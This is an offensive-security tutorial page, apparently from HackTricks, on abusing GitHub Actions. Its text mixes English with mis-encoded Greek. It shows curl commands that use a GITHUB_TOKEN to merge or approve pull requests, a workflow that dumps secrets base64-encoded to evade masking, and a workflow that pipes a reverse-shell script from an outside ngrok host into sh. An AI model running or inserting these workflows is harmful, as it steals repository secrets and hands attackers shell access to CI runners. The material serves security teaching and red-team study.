# Abusing Github Actions

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

In this page you will find:

* A **summary of all the impacts** of an attacker managing to access a Github Action
* Different ways to **get access to an action**:
* Having **permissions** to create the action
* Abusing **pull request** related triggers
* Abusing **other external access** techniques
* **Pivoting** from an already compromised repo
* Finally, a section about **post-exploitation techniques to abuse an action from inside** (cause the mentioned impacts)

## Impacts Summary

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

In case you can **execute arbitrary Github actions/inject code** in a **repository**, you could be able to:

* **ÎšÎ»Î­ÏˆÏ„Îµ** Ï„Î± **Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬** Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ Ï„Î¿ repo/Î¿ÏÎ³Î¬Î½Ï‰ÏƒÎ·.
* If you can only inject, you can steal whatever is already present in the workflow.
* Abuse **repo privileges** to access other platforms such as AWS and GCP.
* **Execute code in custom workers** (if custom workers are used) and try to pivot from there.
* **Overwrite** repository **code**.
* This depends on the privileges of the `GITHUB_TOKEN` (if any).
* **Compromise** **deployments** and other **artifacts**.
* If the code is deploying or storing something you could modify that and obtain some further access.

## GITHUB\_TOKEN

This "**Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.
{% endhint %}

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Note that the token **expires after the job has completed**.\
These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="ÎˆÎ³ÎºÏÎ¹ÏƒÎ· PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÏƒÎµ Ï€Î¿Î»Î»Î­Ï‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ **tokens Ï‡ÏÎ·ÏƒÏ„ÏÎ½ github Î¼Î­ÏƒÎ± ÏƒÎµ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î± Github Actions Î® ÏƒÏ„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬**. Î‘Ï…Ï„Î¬ Ï„Î± tokens Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎ±Ï‚ Î´ÏÏƒÎ¿Ï…Î½ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï€Î¬Î½Ï‰ ÏƒÏ„Î¿ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ ÎºÎ±Î¹ Ï„Î·Î½ Î¿ÏÎ³Î¬Î½Ï‰ÏƒÎ·.
{% endhint %}

<details>

<summary>Î›Î¯ÏƒÏ„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÏÎ½ ÏƒÏ„Î·Î½ Î­Î¾Î¿Î´Î¿ Ï„Î¿Ï… Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Î Î¬ÏÏ„Îµ Î±Î½Ï„Î¯ÏƒÏ„ÏÎ¿Ï†Î· Î¸Î®ÎºÎ· Î¼Îµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î´Î¿Î¸ÎµÎ¯ ÏƒÎµ Î­Î½Î± Github Token ÏƒÎµ Î¬Î»Î»Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½ **ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚** Ï„Ï‰Î½ ÎµÎ½ÎµÏÎ³ÎµÎ¹ÏÎ½:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Î•Ï€Î¹Ï„ÏÎµÏ€ÏŒÎ¼ÎµÎ½Î· Î•ÎºÏ„Î­Î»ÎµÏƒÎ·

{% hint style="info" %}
Î‘Ï…Ï„Î® Î¸Î± Î®Ï„Î±Î½ Î· Ï€Î¹Î¿ ÎµÏÎºÎ¿Î»Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î³Î¹Î± Î½Î± ÏƒÏ…Î¼Î²Î¹Î²Î±ÏƒÏ„Î¿ÏÎ½ Î¿Î¹ Github actions, ÎºÎ±Î¸ÏÏ‚ Î±Ï…Ï„Î® Î· Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï…Ï€Î¿Î¸Î­Ï„ÎµÎ¹ ÏŒÏ„Î¹ Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î³Î¹Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î½Î­Î¿Ï… Î±Ï€Î¿Î¸ÎµÏ„Î·ÏÎ¯Î¿Ï… ÏƒÏ„Î·Î½ Î¿ÏÎ³Î¬Î½Ï‰ÏƒÎ·**, Î® Î­Ï‡ÎµÏ„Îµ **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ ÏƒÎµ Î­Î½Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿**.

Î‘Î½ Î²ÏÎ¯ÏƒÎºÎµÏƒÏ„Îµ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î±Ï€Î»Î¬ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¹Ï‚ [Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ ÎœÎµÏ„Î¬ Ï„Î·Î½ Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Î•ÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï€ÏŒ Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î‘Ï€Î¿Î¸ÎµÏ„Î·ÏÎ¯Î¿Ï…

Î£Îµ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€Î¿Ï… Ï„Î± Î¼Î­Î»Î· Î¼Î¹Î±Ï‚ Î¿ÏÎ³Î¬Î½Ï‰ÏƒÎ·Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î½ Î½Î­Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î±** ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ github actions, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î½Î­Î¿ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ ÎºÎ±Î¹ Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ ÏƒÎµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ Î¿ÏÎ³Î¬Î½Ï‰ÏƒÎ·Ï‚**.

### Î•ÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï€ÏŒ ÎÎ­Î¿ ÎšÎ»Î¬Î´Î¿

Î‘Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î½Î­Î¿ ÎºÎ»Î¬Î´Î¿ ÏƒÎµ Î­Î½Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ Ï€Î¿Ï… Î®Î´Î· Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î¼Î¹Î± ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î· Github Action**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ** Î±Ï…Ï„Î®Î½, **Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ** Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± Î±Ï€ÏŒ Ï„Î¿Î½ Î½Î­Î¿ ÎºÎ»Î¬Î´Î¿**. ÎœÎµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎµÎ¾Î¬Î³ÎµÏ„Îµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ ÏƒÎµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ Î±Ï€Î¿Î¸ÎµÏ„Î·ÏÎ¯Î¿Ï… ÎºÎ±Î¹ Î¿ÏÎ³Î¬Î½Ï‰ÏƒÎ·Ï‚** (Î±Î»Î»Î¬ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï€ÏÏ‚ Î¿Î½Î¿Î¼Î¬Î¶Î¿Î½Ï„Î±Î¹).

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Ï„Î·Î½ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î· **Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î±,** ÏŒÏ„Î±Î½ **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± PR** Î® ÏŒÏ„Î±Î½ **Ï‰Î¸ÎµÎ¯Ï„Î±Î¹ ÎºÎ¬Ï€Î¿Î¹Î¿Ï‚ ÎºÏÎ´Î¹ÎºÎ±Ï‚** (Î±Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î¿ Ï€ÏŒÏƒÎ¿ Î¸ÏŒÏÏ…Î²Î¿ Î¸Î­Î»ÎµÏ„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î´Î¹Î¬Ï†Î¿ÏÎ¿Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Ï„Î­Ï‚ Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± Github Action Î±Ï€ÏŒ Î¬Î»Î»Î¿ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿**. Î•Î¬Î½ Î±Ï…Ï„Î­Ï‚ Î¿Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎ¹Î¼ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÎµÎ¯Î½Î±Î¹ ÎºÎ±ÎºÏÏ‚ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½ÎµÏ‚, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± Ï„Î¹Ï‚ Ï€Î±ÏÎ±Î²Î¹Î¬ÏƒÎµÎ¹.
{% endhint %}

### `pull_request`

ÎŸ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Ï„Î®Ï‚ ÏÎ¿Î®Ï‚ **`pull_request`** Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î· ÏÎ¿Î® ÎºÎ¬Î¸Îµ Ï†Î¿ÏÎ¬ Ï€Î¿Ï… Î»Î±Î¼Î²Î¬Î½ÎµÏ„Î±Î¹ Î­Î½Î± pull request Î¼Îµ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ ÎµÎ¾Î±Î¹ÏÎ­ÏƒÎµÎ¹Ï‚: Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Î±Î½ ÎµÎ¯Î½Î±Î¹ Î· **Ï€ÏÏÏ„Î· Ï†Î¿ÏÎ¬** Ï€Î¿Ï… **ÏƒÏ…Î½ÎµÏÎ³Î¬Î¶ÎµÏƒÏ„Îµ**, ÎºÎ¬Ï€Î¿Î¹Î¿Ï‚ **Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚** Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± **ÎµÎ³ÎºÏÎ¯Î½ÎµÎ¹** Ï„Î·Î½ **ÎµÎºÏ„Î­Î»ÎµÏƒÎ·** Ï„Î·Ï‚ ÏÎ¿Î®Ï‚:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
ÎšÎ±Î¸ÏÏ‚ Î¿ **Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿Ï‚ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏŒÏ‚** Î¹ÏƒÏ‡ÏÎµÎ¹ Î³Î¹Î± **Ï€ÏÏÏ„Î¿Ï…Ï‚** ÏƒÏ…Î½ÎµÎ¹ÏƒÏ†Î­ÏÎ¿Î½Ï„ÎµÏ‚, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± ÏƒÏ…Î¼Î²Î¬Î»ÎµÏ„Îµ **Î´Î¹Î¿ÏÎ¸ÏÎ½Î¿Î½Ï„Î±Ï‚ Î­Î½Î± Î­Î³ÎºÏ…ÏÎ¿ ÏƒÏ†Î¬Î»Î¼Î±/Ï„Ï…Ï€Î¿Î³ÏÎ±Ï†Î¹ÎºÏŒ Î»Î¬Î¸Î¿Ï‚** ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ **Î¬Î»Î»Î± PRs Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î± Î½Î­Î± ÏƒÎ±Ï‚ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± `pull_request`**.

**Î¤Î¿ Î´Î¿ÎºÎ¯Î¼Î±ÏƒÎ± ÎºÎ±Î¹ Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯**: ~~ÎœÎ¹Î± Î¬Î»Î»Î· ÎµÏ€Î¹Î»Î¿Î³Î® Î¸Î± Î®Ï„Î±Î½ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± ÎºÎ¬Ï€Î¿Î¹Î¿Ï… Ï€Î¿Ï… ÏƒÏ…Î½Î­Î²Î±Î»Îµ ÏƒÏ„Î¿ Î­ÏÎ³Î¿ ÎºÎ±Î¹ Î½Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï„Î¿Ï….~~
{% endhint %}

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® **Î±Ï€Î¿Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î¹Ï‚ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚** ÎºÎ±Î¹ **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬** ÏƒÏ„Î¿ ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î¿ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ ÏŒÏ€Ï‰Ï‚ Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÏƒÏ„Î± [**Î­Î³Î³ÏÎ±Ï†Î±**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> ÎœÎµ Ï„Î·Î½ ÎµÎ¾Î±Î¯ÏÎµÏƒÎ· Ï„Î¿Ï… `GITHUB_TOKEN`, **Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î´ÎµÎ½ Î¼ÎµÏ„Î±Ï†Î­ÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„Î®** ÏŒÏ„Î±Î½ Î¼Î¹Î± ÏÎ¿Î® ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î± **forked** Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿. Î¤Î¿ **`GITHUB_TOKEN` Î­Ï‡ÎµÎ¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¼ÏŒÎ½Î¿ Î³Î¹Î± Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·** ÏƒÎµ pull requests **Î±Ï€ÏŒ forked Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î±**.

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿Î½ Î¿ÏÎ¹ÏƒÎ¼ÏŒ Ï„Î·Ï‚ Github Action Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î± Ï€ÏÎ¬Î³Î¼Î±Ï„Î± ÎºÎ±Î¹ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ Î±Ï…Î¸Î±Î¯ÏÎµÏ„ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î´ÎµÎ½ Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± ÎºÎ»Î­ÏˆÎµÎ¹ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î® Î½Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÎ¹ Ï„Î¿ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ Î»ÏŒÎ³Ï‰ Ï„Ï‰Î½ Î±Î½Î±Ï†ÎµÏÏŒÎ¼ÎµÎ½Ï‰Î½ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏÎ½.

{% hint style="danger" %}
**ÎÎ±Î¹, Î±Î½ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î±Î»Î»Î¬Î¾ÎµÎ¹ ÏƒÏ„Î¿ PR Ï„Î·Î½ github action Ï€Î¿Ï… Î¸Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯, Î· Github Action Ï„Î¿Ï… Î¸Î± ÎµÎ¯Î½Î±Î¹ Î±Ï…Ï„Î® Ï€Î¿Ï… Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÎºÎ±Î¹ ÏŒÏ‡Î¹ Î±Ï…Ï„Î® Î±Ï€ÏŒ Ï„Î¿ Î±ÏÏ‡Î¹ÎºÏŒ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿!**
{% endhint %}

ÎšÎ±Î¸ÏÏ‚ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎµÎ»Î­Î³Ï‡ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹, Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Î±Î½ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î® Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ ÏƒÏ„Î¿ `GITHUB_TOKEN`, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î½Î± **Î±Î½ÎµÎ²Î¬ÏƒÎµÎ¹ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î± Î±ÏÏ‡ÎµÎ¯Î±**.

### **`pull_request_target`**

ÎŸ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Ï„Î®Ï‚ ÏÎ¿Î®Ï‚ **`pull_request_target`** Î­Ï‡ÎµÎ¹ **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚** ÏƒÏ„Î¿ ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î¿ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ ÎºÎ±Î¹ **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬** (ÎºÎ±Î¹ Î´ÎµÎ½ Î¶Î·Ï„Î¬ Î¬Î´ÎµÎ¹Î±).

